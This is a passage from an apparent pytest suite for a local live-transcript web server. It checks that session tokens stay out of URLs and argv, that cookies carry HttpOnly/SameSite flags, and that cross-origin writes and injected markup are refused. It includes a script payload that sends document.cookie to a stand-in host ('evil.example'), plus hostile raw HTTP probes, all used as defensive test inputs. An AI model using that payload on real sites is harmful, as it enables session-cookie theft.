    surface = live.surface()
    surface.publish(turn(SECRET_TEXT))

    status, body, headers = _get(_url(surface, "/health"))

    assert status == 200
    assert SECRET_TEXT not in body
    assert surface.token not in body
    assert _set_cookie(headers) == "", "/health handed out a session cookie"


def test_an_unknown_route_is_not_a_way_around_the_credential_check(live):
    """The guard must be on the request, not enumerated per known path.

    Asserted as `403` and not `403 or 404`: the alternative permits exactly the
    outcome the mutation below produces. A `404` here means the router reached its
    fall-through branch and answered from it, which is only possible if the
    credential check did not run first — so the looser assertion could not tell the
    bug from the fix.
    """
    # MUTATION: implement routing as `if path == "/": check()` etc., leaving the
    # fall-through 404 branch un-guarded and reachable without a credential.
    surface = live.surface()
    surface.publish(turn(SECRET_TEXT))

    for path in ("/../events", "/zzz", "/events/", "/names"):
        status, body, _headers = _get(_url(surface, path))

        assert status == 403, f"{path} answered {status} to an uncredentialled GET"
        assert SECRET_TEXT not in body

    # And the credentialled request really does reach a 404, so the 403 above is
    # the guard refusing rather than the route simply not existing.
    assert _get_as_page(surface, "/zzz")[0] == 404


# ==========================================================================
# §8 — the launch ticket, and why the token has no URL form
# ==========================================================================
#
# Launching a chromeless window means handing a URL to a browser as a command-line
# argument. argv is world-readable to every process running as the operator, so a
# URL-borne session token is readable — for the whole call — by exactly the class
# of process §8 says the token exists to exclude. The ticket is what goes there
# instead: single-use, seconds-long, and good for one route.


def test_the_session_token_has_no_url_form_at_all(live):
    """The property the whole design rests on. `url` is the address the page is
    served at and it carries nothing; `launch_url` carries a ticket and never the
    token. A helper that could build a token-bearing URL is how the old shape
    would come back."""
    # MUTATION: `launch_url` -> `f"{self.url}?t={self._token}"`, which is what the
    # surface did before the ticket existed.
    surface = live.surface()

    assert surface.token, "no session token was minted"
    assert surface.token not in surface.url
    assert "?" not in surface.url and "=" not in surface.url

    launch = surface.launch_url()
    assert surface.token not in launch, f"the token is in the launch URL: {launch}"
    assert launch.startswith(f"{surface.url}?k=")
    ticket = launch.split("?k=", 1)[1]
    assert ticket and ticket != surface.token
    assert len(ticket) >= 32, f"a {len(ticket)}-char ticket is guessable inside its TTL"


def test_the_session_token_never_reaches_the_browsers_argv(controller):
    """The same property end to end, through the real `LiveSurface` and the real
    composition the controller performs — because the argv value is chosen by
    `start()`, not by the surface, and a controller that reached for `surface.url`
    plus `surface.token` would put it back with the surface unchanged."""
    # MUTATION: `launch_target = surface.launch_url(...)` ->
    # `launch_target = f"{surface.url}?t={surface.token}"` in
    # `LiveSessionController.start`.
    made: List[LiveSurface] = []

    def real_surface_factory(**kwargs):
        surface = LiveSurface(**kwargs)
        made.append(surface)
        return surface

    harness = controller(surface_factory=real_surface_factory)

    harness.controller.start()

    surface = made[-1]
    assert harness.launched, "the browser was never launched"
    argv_url = harness.launched[-1]
    assert surface.token, "no session token was minted"
    assert surface.token not in argv_url, (
        "the session token was handed to the browser as a command-line argument, "
        "where `ps -axww` reads it for the whole call"
    )
    assert argv_url.startswith(f"{surface.url}?k=")
    # The URL published for a manual open is a DIFFERENT ticket, and equally
    # token-free — it is on the operator's own screen next to the transcript.
    assert surface.token not in harness.messages()
    assert f"{surface.url}?k=" in harness.messages()
    assert argv_url not in harness.messages(), (
        "the argv ticket and the activity-log ticket are the same value, so the "
        "log's long-lived one is readable from `ps` for as long as it lives"
    )


def test_the_argv_ticket_expires_far_sooner_than_the_one_in_the_activity_log(controller):
    """Two tickets with two lifetimes, and the difference is the mitigation. The
    argv one has to cover only the gap between spawning a browser and its first
    GET; the activity-log one has to survive being read and typed by a person, and
    it never enters argv."""
    # MUTATION: `surface.launch_url(_MANUAL_TICKET_TTL_SECONDS)` for BOTH calls in
    # `LiveSessionController.start` — the long-lived ticket then rides in argv.
    harness = controller()

    harness.controller.start()

    ttls = harness.surface.ticket_ttls
    assert len(ttls) == 2, f"expected a launch ticket and a manual one, got {ttls}"
    manual, argv = ttls
    assert argv < manual, f"the argv ticket outlives the manual one: {ttls}"
    assert argv <= 15, f"a {argv}s ticket sits in `ps` output for {argv}s"
    assert manual >= 60, (
        f"a {manual}s ticket is not long enough to read off a log and type"
    )


def test_a_raw_session_token_in_a_query_string_authenticates_nothing(live):
    """The other half of "the token has no URL form": even if one leaked, presenting
    it the way the old build did must not work. `/events` and `/names` are cookie-
    only, and `/` accepts tickets — not tokens — so there is no route left where a
    token in a URL means anything."""
    # MUTATION: `if not surface.authorises(cookie):` ->
    # `if not (surface.authorises(cookie) or surface.authorises(ticket)):` in
    # `_Handler.do_GET`.
    surface = live.surface()
    surface.publish(turn(SECRET_TEXT, label="A"))
    token = surface.token

    for path in ("/events", "/names"):
        for parameter in ("t", "k"):
            status, body, _headers = _get(f"{_url(surface, path)}?{parameter}={token}")
            assert status == 403, f"{path}?{parameter}= served on a raw token"
            assert SECRET_TEXT not in body

    for parameter in ("t", "k"):
        status, _body = _post(
            f"{_url(surface, '/names')}?{parameter}={token}",
            {"label": "A", "name": "Mallory"},
        )
        assert status == 403, f"/names?{parameter}= accepted a raw token"

    # `/` does redeem tickets — and the token is not one.
    assert _get(f"{_url(surface)}?k={token}")[0] == 403
    assert _get(f"{_url(surface)}?t={token}")[0] == 403
    # Nothing above changed the map, so the token really was refused everywhere.
    assert turns_of(live.page(surface).read(4))[0]["display_name"] == "Speaker A"


def test_the_ticket_exchange_sets_an_httponly_samesite_strict_session_cookie(live):
    """`GET /?k=<ticket>` is the whole handover. The flags are the reason it is
    safe to put the token there: `HttpOnly` so the page's own script — which
    renders third-party-derived text — cannot read it, and `SameSite=Strict` so
    another origin the operator has open cannot ride it."""
    # MUTATION: drop `HttpOnly` (or `SameSite=Strict`) from the `Set-Cookie` header
    # built in `_Handler._page`.
    surface = live.surface()
    ticket = surface.mint_ticket(30.0)

    status, body, headers = _get(_ticket_url(surface, ticket))

    assert status == 200
    raw = _set_cookie(headers)
    assert raw, "the ticket exchange handed back no session cookie"
    jar = http.cookies.SimpleCookie()
    jar.load(raw)
    morsel = jar.get(COOKIE_NAME)
    assert morsel is not None, f"the cookie is not named {COOKIE_NAME}: {raw}"
    assert morsel.value == surface.token, "the cookie does not carry the session token"
    assert "httponly" in raw.lower(), f"the session cookie is script-readable: {raw}"
    assert "samesite=strict" in raw.lower(), f"the session cookie is rideable: {raw}"
    assert "path=/" in raw.lower(), f"the cookie does not cover every route: {raw}"
    # Deliberately NOT Secure: this is plain http on loopback, where a browser
    # would drop a Secure cookie and break every route on the page.
    assert "secure" not in raw.lower()
    # And the token is in the header only — never in the document the script sees.
    assert surface.token not in body
    assert "document.cookie" not in body


def test_a_launch_ticket_is_spent_by_the_page_it_opens(live):
    """Single use is what bounds the `ps`-polling race: an attacker who reads the
    ticket out of argv has to beat the browser to it, not merely find it."""
    # MUTATION: delete `del self._tickets[match]` from `LiveSurface.redeem_ticket`.
    surface = live.surface()
    ticket = surface.mint_ticket(30.0)

    first, body, headers = _get(_ticket_url(surface, ticket))
    assert first == 200 and "EventSource" in body
    assert _set_cookie(headers), "the first redemption set no cookie"

    second, _body, second_headers = _get(_ticket_url(surface, ticket))

    assert second == 403, "a spent ticket opened the page a second time"
    assert _set_cookie(second_headers) == "", "a refused request still set a cookie"


def test_an_expired_launch_ticket_is_refused(live):
    """The TTL is the other half of the bound. A ticket that never expired would be
    a standing credential sitting in `ps` output for the life of the session."""
    # MUTATION: drop the `{t: e for t, e in self._tickets.items() if e > now}`
    # expiry sweep from `redeem_ticket` (minting still prunes, so the ticket
    # survives until something else is minted — an intermittent, not a constant).
    surface = live.surface()
    stale = surface.mint_ticket(0.05)
    time.sleep(0.15)

    assert _get(_ticket_url(surface, stale))[0] == 403, "an expired ticket opened the page"

    # A fresh one still works, so the refusal above is expiry and not a broken
    # redemption path.
    assert _get(_ticket_url(surface, surface.mint_ticket(30.0)))[0] == 200


def test_a_reload_still_renders_from_the_cookie_after_its_ticket_is_spent(live):
    """The window is the operator's whole view of a live call, and a reload
    re-presents the ticket the window was opened with — which by then is spent. If
    `/` did not try the cookie first, ⌘R would blank a running session."""
    # MUTATION: delete the `if surface.authorises(cookie): self._page(); return`
    # branch from the `/` arm of `_Handler.do_GET`, leaving the ticket as the only
    # way in.
    surface = live.surface()
    surface.publish(turn("said before the reload", label="A", order=0))
    ticket = surface.mint_ticket(30.0)

    opened, _body, headers = _get(_ticket_url(surface, ticket))
    assert opened == 200
    cookie = _set_cookie(headers).split(";", 1)[0]

    # ⌘R: same URL, same (now spent) ticket, plus the cookie the browser holds.
    reloaded, body, reload_headers = _get(_ticket_url(surface, ticket), cookie=cookie)
    assert reloaded == 200, "a reload of a live session's window was refused"
    assert "EventSource" in body
    assert _set_cookie(reload_headers) == "", (
        "the reload re-issued a cookie, so it went through the ticket path and "
        "burned one; a page that reloads twice would then be locked out"
    )

    # The address bar is cleaned to `/` by the page script, so the next reload
    # carries no ticket at all — and must also work.
    assert _get(_url(surface), cookie=cookie)[0] == 200
    # And the cookie is what the stream and the write path accept.
    assert [t["text"] for t in turns_of(live.page(surface).read(3))] == [
        "said before the reload"
    ]
    assert _post(
        _url(surface, "/names"), {"label": "A", "name": "Dana"}, cookie=cookie
    )[0] == 200


def test_the_page_script_drops_the_spent_ticket_out_of_the_address_bar(page_source):
    """A ticket left in the address bar is a spent credential the operator can copy,
    paste and be baffled by — and it survives into browser history."""
    # MUTATION: delete the `window.history.replaceState({}, "", "/")` call.
    assert "replaceState" in page_source, (
        "the spent ticket stays in the address bar and in browser history"
    )
    assert re.search(r"replaceState\(\s*\{\s*\}\s*,\s*[\"'][\"']\s*,\s*[\"']/[\"']", page_source)


def test_a_non_ascii_credential_is_refused_rather_than_killing_the_handler_thread(live):
    """FR-ERR-5 / §3.8. `secrets.compare_digest` raises `TypeError` on a non-ASCII
    `str`, and every value compared here arrives from the network. A raise inside
    the handler thread is a request with NO response — not a `403`, just a dead
    thread and a traceback on stderr — so the refusal has to survive a credential
    the attacker chose to be unrepresentable.

    Sent raw because `http.client` will not put these bytes on the wire at all:
    through `urllib` the request fails client-side and the server is never tested.

    The TICKET is the route that carries this, and the distinction is worth
    writing down. A non-ASCII cookie never reaches a comparison at all —
    `SimpleCookie` silently drops a morsel whose value is outside its legal set,
    so the cookie arrives as `None` and takes the missing-credential path. The
    query string has no such filter: `parse_qs` hands back whatever was sent, so
    `redeem_ticket` is where an unencodable value meets `compare_digest`. That
    also means a ticket must be OUTSTANDING for the comparison to run at all — an
    empty ticket table short-circuits the loop and would make this test pass
    against a server that has no normalisation whatsoever.
    """
    # MUTATION: `secrets.compare_digest(candidate.encode("utf-8"), supplied)` ->
    # `secrets.compare_digest(candidate, ticket)` in `LiveSurface.redeem_ticket`
    # (i.e. remove the `_as_bytes` normalisation).
    surface = live.surface()
    surface.publish(turn(SECRET_TEXT, label="A"))
    # Outstanding, unredeemed, and long-lived, so the scan really does compare.
    surface.mint_ticket(300.0)
    # Header bytes are decoded latin-1 by `http.server`, so utf-8 on the wire
    # arrives as a non-ASCII `str` — exactly what `compare_digest` refuses.
    hostile = "sesameé中".encode("utf-8")

    probes = {
        "non-ascii cookie": (
            b"GET /events HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            b"Cookie: " + COOKIE_NAME.encode() + b"=" + hostile + b"\r\n"
            b"Connection: close\r\n\r\n"
        ),
        "malformed cookie header": (
            b"GET /events HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            b"Cookie: @@@ not a cookie ;;; =\r\n"
            b"Connection: close\r\n\r\n"
        ),
        "empty cookie": (
            b"GET /events HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            b"Cookie: " + COOKIE_NAME.encode() + b"=\r\n"
            b"Connection: close\r\n\r\n"
        ),
        "percent-encoded non-ascii ticket": (
            b"GET /?k=%C3%A9%E4%B8%AD HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            b"Connection: close\r\n\r\n"
        ),
        "non-ascii ticket on the request line": (
            b"GET /?k=" + hostile + b" HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            b"Connection: close\r\n\r\n"
        ),
    }

    for name, request in probes.items():
        response = _raw_request(surface, request)

        assert response, f"{name}: the handler answered nothing at all"
        assert b" 403 " in _status_line(response), (
            f"{name}: expected a 403, got {_status_line(response)!r}"
        )
        assert SECRET_TEXT.encode() not in response

    # The server survived all of it — a `TypeError` in a handler thread would
    # leave this working too, which is why it is an extra check and not the test.
    assert _get(_url(surface, "/health"))[0] == 200
    assert turns_of(live.page(surface).read(3))[0]["text"] == SECRET_TEXT


# ==========================================================================
# U-3 — a wrong token changes no state and its value is never logged
# ==========================================================================


def test_a_wrong_credential_on_names_changes_no_state_and_is_never_logged(live, caplog):
    """FR-ERR-5. Two halves, and the second is the one that gets forgotten: the
    rejection is logged, the submitted VALUE never is."""
    # MUTATION: `log.warning("rejected /names %s", payload)` — logging the payload
    # on the reject path. Also caught by: applying the name before the check.
    caplog.set_level(logging.DEBUG)
    surface = live.surface()
    surface.publish(turn("their line", label="A"))
    attacker_value = "MalloryPlantedThisName"

    status, _body = _post(
        _url(surface, "/names"),
        {"label": "A", "name": attacker_value},
        cookie=_session_cookie(surface, "wrong"),
    )

    assert status == 403
    page = live.page(surface)
    rendered = turns_of(page.read(4))
    assert rendered, "backlog was empty; the state assertion would be vacuous"
    assert all(t["display_name"] != attacker_value for t in rendered), (
        "a rejected /names still mutated the map"
    )
    blob = "\n".join(record.getMessage() for record in caplog.records)
    assert attacker_value not in blob


# ==========================================================================
# §8 — the cookie is ambient, so the one route that WRITES needs consent
# ==========================================================================


@pytest.mark.parametrize(
    "description,extra",
    [
        # What a browser sends when a page on ANOTHER loopback port issues the
        # write. Same-site (scheme + registrable host match, port ignored), so
        # `SameSite=Strict` attaches this session's cookie to it.
        ("another local port", {"Sec-Fetch-Site": "same-site",
                                "Origin": "http://127.0.0.1:9999"}),
        # A real third-party page. `Sec-Fetch-Site` alone, no Origin echoed.
        ("a remote site", {"Sec-Fetch-Site": "cross-site", "Origin": None}),
        # Origin alone, disagreeing with Host — the pre-`Sec-Fetch-Site` browser.
        ("origin only, wrong", {"Sec-Fetch-Site": None,
                                "Origin": "http://evil.example"}),
        # Neither signal. Not a browser, and not trusted on that basis: allowing
        # this makes the check fail OPEN for anything that simply omits it.
        ("no origin signal at all", {"Sec-Fetch-Site": None, "Origin": None}),
    ],
)
def test_the_names_write_refuses_a_request_that_cannot_prove_its_origin(
    live, description, extra
):
    """§8 / FR-ERR-5. Holding the cookie is not evidence the operator asked.

    Cookies are scoped by HOST and not by port, and `SameSite` computes
    same-site on scheme and registrable host and ignores the port too — so every
    `http://127.0.0.1:*` page the operator has open is same-site with this
    surface, and the browser attaches this session's cookie to writes those
    pages issue. That is exactly the origin class §8 names. A cross-origin write
    does not need to READ the response to do its damage, which is why this route
    is guarded and the read routes are left to CORS.
    """
    # MUTATION: delete the `if not self._same_origin_post(): ... return` branch
    # from `_Handler.do_POST` — the cookie alone then carries the write.
    surface = live.surface()
    surface.publish(turn("their line", label="A"))

    status, _body = _post(
        _url(surface, "/names"),
        {"label": "A", "name": "pwned"},
        cookie=_session_cookie(surface),
        headers=extra,
    )

    assert status == 403, f"{description}: the write was accepted"
    rendered = turns_of(live.page(surface).read(3))
    assert rendered, "backlog was empty; the state assertion would be vacuous"
    assert all(t["display_name"] != "pwned" for t in rendered), (
        f"{description}: refused with a {status} but set the name anyway"
    )


def test_the_names_write_is_accepted_from_the_page_this_server_served(live):
    """The other end of the same check, and the reason it is two signals.

    Without this, "refuse everything" would satisfy the refusal tests above
    perfectly while the control panel silently stopped working — which is the
    failure mode a CSRF guard actually ships with.
    """
    # MUTATION: `return matched` -> `return False` in `_same_origin_post`, or
    # comparing `Origin` against a hardcoded `127.0.0.1:<port>` (which refuses a
    # window the operator opened at `http://localhost:<port>`).
    surface = live.surface()
    surface.publish(turn("a line", label="A"))
    origin = f"http://127.0.0.1:{surface.port}"

    # A browser that sends `Sec-Fetch-Site` — every current one does.
    modern, _body = _post(
        _url(surface, "/names"),
        {"label": "A", "name": "Dana"},
        cookie=_session_cookie(surface),
        headers={"Sec-Fetch-Site": "same-origin", "Origin": origin},
    )
    assert modern == 200
    assert turns_of(live.page(surface).read(3))[0]["display_name"] == "Dana"

    # And one that sends only `Origin`, matching the `Host` it was addressed to.
    older, _body = _post(
        _url(surface, "/names"),
        {"label": "A", "name": "Priya"},
        cookie=_session_cookie(surface),
        headers={"Sec-Fetch-Site": None, "Origin": origin},
    )
    assert older == 200, "an Origin equal to Host was refused"
    assert turns_of(live.page(surface).read(3))[0]["display_name"] == "Priya"


def test_a_planted_duplicate_cookie_does_not_lock_the_operator_out(live):
    """§3.8. The same port-blind cookie scope, used the other way round.

    Any `http://127.0.0.1:*` page can `Set-Cookie: hidock_live=...` for the HOST,
    and the browser then presents BOTH values on every request to this surface.
    Parsing the whole `Cookie:` header with one `SimpleCookie().load()` is dict
    assignment, so the last morsel of a repeated name wins and a planted value
    appended after the real one discards it — the operator is refused from their
    own live window, mid-call, with nothing on screen saying why. One malformed
    pair does the same thing by a different route: whole-header parsing stops at
    it and takes every pair after it down as well.
    """
    # MUTATION: `for pair in raw.split(";"):` -> `for pair in [raw]:` in
    # `_Handler._session_cookies` — i.e. parse the header as one unit again.
    surface = live.surface()
    real = _session_cookie(surface)

    jars = {
        "planted after the real cookie": f"{real}; {COOKIE_NAME}=planted",
        "planted before the real cookie": f"{COOKIE_NAME}=planted; {real}",
        "planted on both sides": f"{COOKIE_NAME}=x; {real}; {COOKIE_NAME}=y",
        "a malformed pair first": f"junk; {real}",
        "a malformed pair last": f"{real}; junk",
        "an unrelated cookie alongside": f"theme=dark; {real}; sid=abc",
    }

    for description, jar in jars.items():
        status, _body, _headers = _get(_url(surface), cookie=jar)
        assert status == 200, f"{description}: the operator was locked out ({status})"

    # The refusal still works — the fix widened the search, it did not stop
    # comparing. A jar holding only planted values is not a session.
    assert _get(_url(surface), cookie=f"{COOKIE_NAME}=x; {COOKIE_NAME}=y")[0] == 403


# ==========================================================================
# U-4 / U-5 — the backlog ring
# ==========================================================================


def test_a_page_opened_mid_call_receives_the_backlog_in_order(live):
    """FR-1.5. Opening the window after a call started, or reloading it, must not
    hand the operator an empty transcript."""
    # MUTATION: drop the backlog replay and send only events that arrive AFTER the
    # subscriber attaches (`self._subscribers.append(w)` without the ring loop).
    surface = live.surface()
    for index, text in enumerate(["first line", "second line", "third line"]):
        surface.publish(turn(text, order=index))

    page = live.page(surface)
    replayed = turns_of(page.read(6))

    assert [t["text"] for t in replayed] == ["first line", "second line", "third line"]


def test_the_ring_is_bounded_and_drops_the_oldest_first(live):
    """FR-1.5. Unbounded growth on a long call is a memory leak in a process that
    is also holding a USB stream open."""
    # MUTATION: `deque(maxlen=ring_size)` -> `deque()`, or `.popleft()` -> `.pop()`
    # (which would drop the NEWEST and still keep the length bounded).
    surface = live.surface(ring_size=3)
    for index in range(4):
        surface.publish(turn(f"line {index}", order=index))

    page = live.page(surface)
    replayed = turns_of(page.read(6))

    assert [t["text"] for t in replayed] == ["line 1", "line 2", "line 3"]


def test_the_ring_default_is_two_thousand_turns(live):
    """FR-1.5 names the default; a smaller one silently truncates a long call's
    scrollback on reload, which reads as data loss rather than as a bound."""
    # MUTATION: `ring_size: int = 2000` -> `ring_size: int = 200`.
    assert inspect.signature(LiveSurface.__init__).parameters["ring_size"].default == 2000


# ==========================================================================
# U-6 / U-7 / U-8 — naming is a render-time projection
# ==========================================================================


def test_a_name_typed_now_applies_to_turns_already_emitted(live):
    """FR-3.3. A name applied only going forward leaves one speaker under two
    names in one transcript — which is worse than no naming at all."""
    # MUTATION: apply the map only in the broadcast path, so the backlog replay
    # sends the raw label. Equivalently: stamp display_name at arrival time.
    surface = live.surface()
    surface.publish(turn("said earlier", label="A", order=0))

    surface.set_name("A", "Dana")

    replayed = turns_of(live.page(surface).read(4))
    assert [t["display_name"] for t in replayed] == ["Dana"]


def test_a_name_change_reaches_a_page_that_is_already_open(live):
    """FR-3.3's other half: the operator types the name while watching the window,
    so the change must push, not wait for the next reload."""
    # MUTATION: `set_name` updates the map without broadcasting a `names` event.
    surface = live.surface()
    surface.publish(turn("said earlier", label="A", order=0))
    page = live.page(surface)
    page.read(4)  # consume connect-time status/names/backlog

    surface.set_name("A", "Dana")

    updates = kinds(page.read(3), "names")
    assert updates, "no names event was pushed to the open page"
    assert updates[-1]["names"]["A"] == "Dana"


def test_names_are_projected_not_baked_in_so_clearing_reverts(live):
    """FR-3.2 / FR-3.5. If the name were written into the stored turn, clearing it
    would leave the old name behind — the corruption of exactly the history the
    operator curated."""
    # MUTATION: store the display name on the turn at set_name time
    # (`t.display_name = name` over the ring) instead of projecting at send time.
    surface = live.surface()
    surface.publish(turn("said earlier", label="A", order=0))
    surface.set_name("A", "Dana")
    assert turns_of(live.page(surface).read(4))[0]["display_name"] == "Dana"

    surface.set_name("A", None)

    replayed = turns_of(live.page(surface).read(4))
    assert replayed[0]["display_name"] == "Speaker A"
    assert replayed[0]["label"] == "A", "the stored label must survive naming"


def test_a_speaker_revision_re_renders_the_line_under_the_new_labels_name(live):
    """U-7 / FR-3.2. The provider reassigns a LINE from label A to label B; the line
    must then render with whatever name B carries, and the operator's map must be
    untouched by the reassignment."""
    # MUTATION: handle LiveSpeakerRevision by rewriting the NAME map
    # (`self._names[old] = self._names[new]`) instead of the turn's label. Also
    # caught by: ignoring revisions for turns already in the ring.
    surface = live.surface()
    surface.set_name("B", "Priya")
    surface.publish(turn("misattributed line", label="A", order=12))

    surface.publish(LiveSpeakerRevision(channel=LiveChannel.FAR, turn_order=12, speaker="B"))

    page = live.page(surface)
    payloads = page.read(6)
    revised = turns_of(payloads)[0]
    assert revised["label"] == "B"
    assert revised["display_name"] == "Priya"
    names = kinds(payloads, "names")[-1]["names"]
    assert names == {"B": "Priya"}, f"the operator's map was mutated: {names}"


def test_a_revision_is_matched_by_channel_as_well_as_turn_order(live):
    """`turn_order` alone does not identify a turn — the two sessions count from
    zero independently, so a far-channel revision must not move a near line."""
    # MUTATION: match revisions on `t.turn_order == event.turn_order` only,
    # dropping the channel comparison.
    surface = live.surface(operator_name="Blake")
    surface.publish(near("my own words", order=12))
    surface.publish(turn("their words", label="A", order=12))

    surface.publish(LiveSpeakerRevision(channel=LiveChannel.FAR, turn_order=12, speaker="B"))

    replayed = turns_of(live.page(surface).read(6))
    by_channel = {t["channel"]: t for t in replayed}
    assert by_channel["near"]["display_name"] == "Blake"
    assert by_channel["near"]["label"] is None
    assert by_channel["far"]["label"] == "B"


def test_an_unmapped_label_renders_as_the_providers_own_label(live):
    """FR-3.4. Never a guess and never blank — a blank speaker column reads as a
    rendering bug, and a guess is a claim the surface has no authority to make."""
    # MUTATION: `self._names.get(label, f"Speaker {label}")` -> `.get(label, "")`
    # or `.get(label)` (returning None).
    surface = live.surface()
    surface.publish(turn("unnamed so far", label="A"))

    replayed = turns_of(live.page(surface).read(4))

    assert replayed[0]["display_name"] == "Speaker A"


def test_a_mapped_label_renders_as_the_mapped_name(live):
    """The positive half; asymmetric labels so a swapped lookup cannot pass."""
    # MUTATION: index the map by display name instead of by label
    # (`{v: k for k, v in ...}`), or ignore the map in the render.
    surface = live.surface()
    surface.set_name("A", "Dana")
    surface.set_name("B", "Priya")
    surface.publish(turn("first speaker", label="A", order=0))
    surface.publish(turn("second speaker", label="B", order=1))

    replayed = turns_of(live.page(surface).read(6))

    assert [t["display_name"] for t in replayed] == ["Dana", "Priya"]


def test_a_submitted_name_is_bounded_to_sixty_four_characters(live):
    """FR-3.5. `/names` is an untrusted input (§8); an unbounded string is stored in
    a process holding a USB stream and re-broadcast to every subscriber."""
    # MUTATION: drop the `[:64]` truncation (or the length rejection) in the
    # /names handler.
    surface = live.surface()
    surface.publish(turn("a line", label="A"))

    status, _body = _post_as_page(surface, {"label": "A", "name": "N" * 500})

    assert status in (200, 400)
    rendered = turns_of(live.page(surface).read(4))[0]["display_name"]
    assert len(rendered) <= 64, f"stored a {len(rendered)}-char name"


def test_the_names_post_is_the_route_that_actually_sets_the_map(live):
    """The page's only write path. Testing `set_name()` alone would leave the HTTP
    handler free to parse the body wrongly and never be caught."""
    # MUTATION: parse the POST body as form-encoded while the page sends JSON —
    # the handler then silently sets nothing.
    surface = live.surface()
    surface.publish(turn("a line", label="A"))

    status, _body = _post_as_page(surface, {"label": "A", "name": "Dana"})

    assert status == 200
    assert turns_of(live.page(surface).read(4))[0]["display_name"] == "Dana"


# ==========================================================================
# U-9 — operator identity
# ==========================================================================


def test_near_turns_render_as_the_configured_operator_name(live):
    """FR-4.1. Phase 1b deliberately emits `speaker=None` on the near channel and
    leaves the resolution to this renderer."""
    # MUTATION: render near turns from the label map like far turns, so the
    # operator's own lines come out as "Speaker None" / blank.
    surface = live.surface(operator_name="Blake")
    surface.publish(near("yeah one second"))

    replayed = turns_of(live.page(surface).read(4))

    assert replayed[0]["display_name"] == "Blake"
    assert replayed[0]["channel"] == "near"


def test_the_operator_name_defaults_to_me(live):
    """FR-4.2. A neutral default that is true for every user of a public clone."""
    # MUTATION: `operator_name: str = "Me"` -> `"Blake"` (the maintainer's name,
    # which is what a default lifted from this machine would be).
    assert inspect.signature(LiveSurface.__init__).parameters["operator_name"].default == "Me"

    surface = live.surface()
    surface.publish(near("yeah one second"))

    assert turns_of(live.page(surface).read(4))[0]["display_name"] == "Me"


def test_the_operator_name_is_never_derived_from_the_os_account():
    """FR-4.2. An OS account name is frequently a handle, so deriving it would put
    a stranger's username in their own transcript. Structural, because a behavioural
    test would have to know what this machine's account is called."""
    # MUTATION: `operator_name or getpass.getuser()` anywhere in live_server.py.
    import hidock_direct.live_server as module

    source = inspect.getsource(module)
    tree = ast.parse(source)
    called = {
        ast.unparse(node.func)
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
    }
    for banned in ("getpass.getuser", "os.getlogin", "pwd.getpwuid", "socket.gethostname"):
        assert banned not in called, f"live_server derives identity from {banned}()"
    assert "USER" not in source and "LOGNAME" not in source


def test_the_operator_is_not_a_row_in_the_control_panel(live):
    """FR-4.3. The panel exists for labels discovered DURING the call; the operator
    is configuration. A row for them invites a per-call edit that then disagrees
    with `HIDOCK_OPERATOR_NAME` on the next call."""
    # MUTATION: add every turn's channel to the label set, so "near" appears as a
    # nameable row.
    # MUTATION: `if label is None or channel != LiveChannel.FAR.value:` ->
    # `if label is None:` in `_note_label`. Only the LABELLED near turn below
    # catches that one — a `near()` turn carries `label=None` and short-circuits
    # on the first half of the condition, so the channel half is never evaluated
    # and a test built only from the helper scores this row as pinned when it is
    # not.
    surface = live.surface(operator_name="Blake")
    surface.publish(near("my own line"))
    # A near-channel turn that DOES carry a label. This is the second layer of a
    # two-layer defence: `live_transcribe._speaker_of` refuses to attach a label
    # to the near channel "even if one arrives", and this layer exists precisely
    # to survive that one being changed — so it has to be exercised against the
    # input that layer currently makes impossible, not against the input it
    # guarantees.
    surface.publish(turn("also mine", channel=LiveChannel.NEAR, label="A", order=1))

    labels = kinds(live.page(surface).read(4), "names")[-1]["labels"]

    assert labels == [], f"the near channel produced control-panel rows: {labels}"


def test_naming_a_label_cannot_rename_the_operator(live):
    """The same requirement from the attack side: `/names` must not reach the near
    channel's identity by any label value."""
    # MUTATION: resolve the near name as `self._names.get(NEAR_KEY, operator_name)`,
    # making the operator's identity writable over HTTP.
    surface = live.surface(operator_name="Blake")
    surface.publish(near("my own line"))

    for label in ("near", "Me", "Blake", "operator", "None", ""):
        _post_as_page(surface, {"label": label, "name": "Somebody Else"})

    assert turns_of(live.page(surface).read(4))[0]["display_name"] == "Blake"


# ==========================================================================
# U-10 / FR-2.x — the page
# ==========================================================================

_MARKUP = '<script>fetch("http://evil.example/"+document.cookie)</script>'


def _js_function(source: str, name: str) -> str:
    """The body of one named function in the page script, by brace matching.

    Splitting on the next `function ` keyword breaks on any function holding a
    callback — `paintPanel` holds two — and silently returns a truncated body,
    which makes an assertion about what a function does NOT contain vacuous.
    """
    start = source.index(f"function {name}(")
    opened = source.index("{", source.index(")", start))
    depth = 0
    for index in range(opened, len(source)):
        if source[index] == "{":
            depth += 1
        elif source[index] == "}":
            depth -= 1
            if depth == 0:
                return source[start:index + 1]
    raise AssertionError(f"function {name} has unbalanced braces")


@pytest.fixture
def page_source(live) -> str:
    surface = live.surface()
    status, body, headers = _get_as_page(surface, "/")
    assert status == 200, f"the page did not render: {status}"
    assert "text/html" in headers.get("Content-Type", "")
    return body


def test_turn_text_is_carried_as_data_not_spliced_into_the_document(live):
    """FR-2.6, half one — the emitted payload. Transcript content is third-party-
    derived text arriving over the network."""
    # MUTATION: build the SSE frame by string-formatting the turn into an HTML
    # fragment (`data: <div>{text}</div>`) instead of JSON-encoding it.
    surface = live.surface()
    surface.publish(turn(_MARKUP, label="A"))

    payload = turns_of(live.page(surface).read(4))[0]

    assert payload["text"] == _MARKUP, "the text must survive verbatim as DATA"
    assert payload["kind"] == "turn"


def test_the_served_page_never_contains_transcript_text(live):
    """The document is static; turns arrive over SSE. A template substitution would
    put attacker-controlled markup into the document the browser parses."""
    # MUTATION: render the backlog into the HTML template at request time.
    surface = live.surface()
    surface.publish(turn(_MARKUP, label="A"))

    _status, body, _headers = _get_as_page(surface, "/")

    assert "<script>fetch(" not in body
    assert "evil.example" not in body


def test_the_page_inserts_turn_text_as_text_and_never_as_markup(page_source):
    """FR-2.6, half two — the insertion path. This is the half that actually
    executes: a correct payload rendered with `innerHTML` is still an injection
    into the operator's own window."""
    # MUTATION: `node.textContent = t.text` -> `node.innerHTML = t.text`.
    assert "textContent" in page_source or "createTextNode" in page_source
    for banned in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval("):
        assert banned not in page_source, f"the page uses {banned}"


def test_the_page_fetches_no_external_asset(page_source):
